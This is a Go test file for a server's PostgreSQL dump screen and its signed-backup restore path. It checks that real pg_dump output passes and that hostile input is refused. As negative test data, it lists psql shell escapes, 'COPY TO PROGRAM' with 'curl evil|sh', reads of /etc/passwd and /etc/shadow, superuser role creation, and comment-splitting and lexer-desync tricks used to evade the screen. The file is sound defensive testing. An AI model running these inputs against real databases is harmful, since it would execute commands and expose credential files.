package server

import (
	"crypto/sha256"
	"encoding/hex"
	"log/slog"
	"os"
	"strings"
	"testing"
)

const pgDumpSample = `--
-- PostgreSQL database dump
--

\restrict AbCdEf0123456789

SET statement_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;

DROP TABLE IF EXISTS public.users;
CREATE TABLE public.users (
    id text NOT NULL,
    note text DEFAULT 'it''s \ fine'::text,
    pattern text DEFAULT E'C:\\Users\\x'
);

/* a block /* nested */ comment with \! inside */
COPY public.users (id, note, pattern) FROM stdin;
usr-1	hello \N	C:\\Program Files\\x
usr-2	\! not a command here	\.notend
\.

SELECT pg_catalog.setval('public.audit_id_seq', 42, true);
CREATE INDEX idx ON public.users USING btree (id);
COMMENT ON TABLE public.users IS $$dollar \ quoted$$;
COMMENT ON COLUMN public.users.id IS $tag$ also \ fine $tag$;

\unrestrict AbCdEf0123456789
`

func TestScanDumpAcceptsPgDumpOutput(t *testing.T) {
	for _, strict := range []bool{false, true} {
		if err := scanDump(strings.NewReader(pgDumpSample), strict); err != nil {
			t.Fatalf("strict=%v: a pg_dump-shaped dump was refused: %v", strict, err)
		}
	}
}

// TestScanDumpRealPgDump screens an actual pg_dump of a mustra database
// when one is supplied (MUSTRA_TEST_PGDUMP=path), in both modes: a false
// positive here is a restore that cannot be done.
func TestScanDumpRealPgDump(t *testing.T) {
	path := os.Getenv("MUSTRA_TEST_PGDUMP")
	if path == "" {
		t.Skip("set MUSTRA_TEST_PGDUMP to a pg_dump --format=plain file")
	}
	for _, strict := range []bool{false, true} {
		f, err := os.Open(path)
		if err != nil {
			t.Fatal(err)
		}
		err = scanDump(f, strict)
		f.Close()
		if err != nil {
			t.Fatalf("strict=%v: real pg_dump refused: %v", strict, err)
		}
	}
}

func TestScanDumpRefusesShellAndProgram(t *testing.T) {
	attacks := map[string]string{
		"bang at line start":        "\\! sh -c 'id'\n",
		"bang mid statement":        "SELECT 1 \\! id\n;",
		"bang after a statement":    "SELECT 1; \\! id\n",
		"copy to program meta":      "\\copy (select 1) to program 'id'\n",
		"output pipe":               "\\o |id\nSELECT 1;\n",
		"include file":              "\\i /etc/passwd\n",
		"set variable":              "\\set x 1\n",
		"copy program server side":  "COPY public.t FROM PROGRAM 'id';\n",
		"copy to program":           "COPY (SELECT 1) TO PROGRAM 'curl evil|sh';\n",
		"copy server file":          "COPY public.t FROM '/etc/passwd';\n",
		"after copy data":           "COPY public.t (a) FROM stdin;\nx\n\\.\n\\! id\n",
		"string desync":             "SET standard_conforming_strings = off;\nSELECT 'a\\' \\! id ';\n",
		"set_config desync":         "SELECT set_config('standard_conforming_strings', 'off', false);\n",
		"unterminated":              "SELECT 'abc\n",
		"restrict with junk":        "\\restrict abc; \\! id\n",
		"e-string escape then bang": "SELECT E'\\'' \\! id\n;",
	}
	for name, sql := range attacks {
		if err := scanDump(strings.NewReader(sql), false); err == nil {
			t.Errorf("%s: accepted:\n%s", name, sql)
		}
	}
}

func TestScanDumpStrictRefusesDatabasePowers(t *testing.T) {
	for _, sql := range []string{
		"CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$;\n",
		"CREATE OR REPLACE FUNCTION x() RETURNS void AS $$ BEGIN EXECUTE 'COPY t TO PROGRAM ''id'''; END $$ LANGUAGE plpgsql;\n",
		"DO $$ BEGIN PERFORM 1; END $$;\n",
		"ALTER SYSTEM SET archive_command = 'id';\n",
		"CREATE EXTENSION plpython3u;\n",
		"SELECT lo_import('/etc/shadow');\n",
		"SELECT pg_read_file('/etc/passwd');\n",
		"CREATE ROLE evil SUPERUSER;\n",
		"SET ROLE postgres;\n",
		"CREATE TRIGGER t AFTER INSERT ON x FOR EACH ROW EXECUTE FUNCTION f();\n",
	} {
		if err := scanDump(strings.NewReader(sql), true); err == nil {
			t.Errorf("strict screen accepted %q", sql)
		}
	}
}

func TestBackupManifestSignature(t *testing.T) {
	key := []byte("0123456789abcdef0123456789abcdef")
	m := BackupManifest{ID: "bk1", DatabaseSHA256: "aa", CreatedBy: "root"}
	m.Signature = manifestMAC(key, m)
	if !verifyManifest(key, m) {
		t.Fatal("own signature does not verify")
	}
	tampered := m
	tampered.DatabaseSHA256 = "bb"
	if verifyManifest(key, tampered) {
		t.Fatal("a tampered manifest verified")
	}
	if verifyManifest([]byte("another key another key another k"), m) {
		t.Fatal("a foreign key verified")
	}
	m.Signature = ""
	if verifyManifest(key, m) {
		t.Fatal("an unsigned manifest verified")
	}
}

// An unsigned archive (anything not taken by this server) is refused by
// the normal restore before psql is ever run.
func TestRestoreRefusesUnsignedArchive(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("MUSTRA_BACKUP_SIGNING_KEY", "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff")
	path := writeArchive(t, dir, "bk-x", BackupManifest{ID: "bk-x", DatabaseSHA256: "x"},
		map[string]string{backupDatabaseName: "\\! id\n"})
	s := &Server{logger: slog.Default()}
	_, err := s.restoreBackup(t.Context(), path, "mgr", false)
	if err == nil || !strings.Contains(err.Error(), "not signed by this server") {
		t.Fatalf("unsigned archive: %v", err)
	}
	// Even on the external path the dump screen stops it.
	_, err = s.restoreBackup(t.Context(), path, "root", true)
	if err == nil {
		t.Fatal("external import of a shell-escape dump was accepted")
	}
}

// A comment is whitespace to Postgres. The screen used to drop comments
// outright, so COPY/**/t/**/FROM/**/PROGRAM lexed as one word that no
// keyword check matched (review finding). Every comment form, and quoting
// that hides a name, must still be seen.
func TestScanDumpCommentsAndQuotingDoNotHideKeywords(t *testing.T) {
	both := []string{
		"COPY/**/t/**/FROM/**/PROGRAM/**/'x';\n",
		"COPY/* a /* nested */ one */t FROM PROGRAM 'x';\n",
		"COPY--c\nt--c\nFROM--c\nPROGRAM 'x';\n",
		"COPY t FROM/**/PROGRAM 'x';\n",
		"COPY t FROM stdin/**/WITH (PROGRAM 'x');\n",
	}
	for _, sql := range both {
		for _, strict := range []bool{false, true} {
			if err := scanDump(strings.NewReader(sql), strict); err == nil {
				t.Errorf("strict=%v accepted %q", strict, sql)
			}
		}
	}
	strictOnly := []string{
		"CREATE/**/FUNCTION f() RETURNS int LANGUAGE sql AS 'select 1';\n",
		"CREATE--x\nFUNCTION f() RETURNS int LANGUAGE sql AS 'select 1';\n",
		"CREATE/*a/*b*/c*/OR/**/REPLACE/**/FUNCTION f() RETURNS int LANGUAGE sql AS 'select 1';\n",
		"SELECT \"pg_read_file\"('x');\n",
		"SELECT pg_catalog.\"lo_import\"('x');\n",
		"SELECT U&\"\\0070g_read_file\"('x');\n",
		"SELECT U&'\\0041';\n",
		"ALTER/**/SYSTEM SET work_mem = '1MB';\n",
		"DO/**/$$ BEGIN END $$;\n",
		"/**/DO $$ BEGIN END $$;\n",
	}
	for _, sql := range strictOnly {
		if err := scanDump(strings.NewReader(sql), true); err == nil {
			t.Errorf("strict screen accepted %q", sql)
		}
	}
	// What pg_dump does write still passes: quoted identifiers, E'' and
	// dollar strings, comments between tokens, a quoted "COPY"-named column.
	fine := []string{
		"COPY public.\"Users\" (id, \"COPY\") FROM stdin;\nx\ty\n\\.\n",
		"COPY public.t (a) /* c */ FROM stdin;\nx\n\\.\n",
		"COMMENT ON TABLE public.t IS E'it\\'s';\n",
		"CREATE TABLE \"weird \"\"name\"\"\" (a text DEFAULT $q$x$q$);\n",
		"SELECT 1 -- trailing\n;\n",
	}
	for _, sql := range fine {
		for _, strict := range []bool{false, true} {
			if err := scanDump(strings.NewReader(sql), strict); err != nil {
				t.Errorf("strict=%v refused legitimate %q: %v", strict, sql, err)
			}
		}
	}
}

// The external import runs the screen before psql: a comment-split
// COPY … PROGRAM dump is refused there, so psql never sees it.
func TestRestoreRefusesCommentSplitCopyProgram(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("MUSTRA_BACKUP_SIGNING_KEY", "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff")
	dump := "COPY/**/t/**/FROM/**/PROGRAM/**/'x';\n"
	sum := sha256.Sum256([]byte(dump))
	path := writeArchive(t, dir, "bk-c", BackupManifest{ID: "bk-c", DatabaseSHA256: hex.EncodeToString(sum[:])},
		map[string]string{backupDatabaseName: dump})
	s := &Server{logger: slog.Default()}
	_, err := s.restoreBackup(t.Context(), path, "root", true)
	// Refused by the screen itself (not the checksum), which runs before
	// applyDump starts psql.
	if err == nil || !strings.Contains(err.Error(), "the dump was refused") || !strings.Contains(err.Error(), "COPY") {
		t.Fatalf("external import of a comment-split COPY … PROGRAM dump: %v", err)
	}
}

// Three bypass classes the fuzz track confirmed (branch fuzz): psql counts
// high-bit bytes and '$' as identifier characters, so a dollar-quote tag or
// E-string boundary the scanner lexed differently let a trailing \! run;
// and a COPY whose target is PROGRAM with a column/clause named "stdin"
// matched the loose stdin rule.
func TestScanDumpPsqlLexerDesyncBypasses(t *testing.T) {
	for _, sql := range []string{
		"SELECT 1 AS x$$a$; \\! id\nSELECT 1 AS y$a$;\n",
		"SELECT $é$ ' $é$; \\! id\nSELECT $é$ ' $é$;\n",
		"CREATE TABLE t (stdin int);\nCOPY t FROM PROGRAM 'id' WHERE stdin IS DISTINCT FROM stdin;\n\\! id\n\\.\n",
		"COPY t FROM PROGRAM 'id' WHERE stdin;\n",
		"COPY t TO PROGRAM 'id';\n",
		"COPY t TO STDOUT; COPY t FROM PROGRAM 'id';\n",
	} {
		for _, strict := range []bool{false, true} {
			if err := scanDump(strings.NewReader(sql), strict); err == nil {
				t.Errorf("strict=%v accepted %q", strict, sql)
			}
		}
	}
	// A dollar-quoted string whose tag is non-ASCII is still legitimate
	// dump content and must pass.
	for _, sql := range []string{
		"INSERT INTO t VALUES ($é$ hi ' there $é$);\n",
		"COPY public.t (a) FROM stdin;\nrow\n\\.\n",
		"COPY public.t (a) TO stdout;\n",
	} {
		if err := scanDump(strings.NewReader(sql), true); err != nil {
			t.Errorf("refused legitimate %q: %v", sql, err)
		}
	}
}
